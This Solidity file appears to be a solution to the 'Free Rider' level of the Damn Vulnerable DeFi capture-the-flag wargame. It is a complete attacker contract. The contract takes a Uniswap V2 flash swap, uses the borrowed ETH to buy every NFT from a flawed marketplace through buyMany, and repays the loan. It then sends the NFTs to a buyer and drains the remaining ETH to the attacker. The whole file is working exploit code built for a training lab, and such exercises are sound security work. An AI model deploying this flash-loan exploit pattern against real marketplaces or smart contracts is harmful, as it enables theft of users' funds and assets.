// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./FreeRiderNFTMarketplace.sol";
import "../WETH9.sol";
import "../DamnValuableNFT.sol";

contract FreeRiderAttacker is ReentrancyGuard, IERC721Receiver {
    FreeRiderNFTMarketplace market;
    IUniswapV2Pair uniV2Pair;
    WETH9 weth;
    DamnValuableNFT nft;
    address buyer;
    address attacker;
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address payable _market,
        address _uniV2Pair,
        address payable _weth,
        address _nft,
        address _buyer,
        address _attacker
    ) {
        market = FreeRiderNFTMarketplace(_market);
        uniV2Pair = IUniswapV2Pair(_uniV2Pair);
        weth = WETH9(_weth);
        nft = DamnValuableNFT(_nft);
        buyer = _buyer;
        attacker = _attacker;
    }

    function attack() public {
        // data passed to uniswapV2Call
        bytes memory data = abi.encode(weth, msg.sender);

        uniV2Pair.swap(15 ether, 0, address(this), data);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
        }
        payable(attacker).transfer(address(this).balance);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(uniV2Pair), "not pair");
        require(sender == address(this), "not contract as sender");

        weth.withdraw(amount0);

        // try buy all the nfts in the marketplace
        market.buyMany{value: 15 ether}(tokenIds);

        uint256 fee = (amount0 * 3) / 997 + 1;
        uint256 amountToRepay = amount0 + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniV2Pair), amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override nonReentrant returns (bytes4) {
        require(msg.sender == address(nft));
        require(tx.origin == attacker);
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
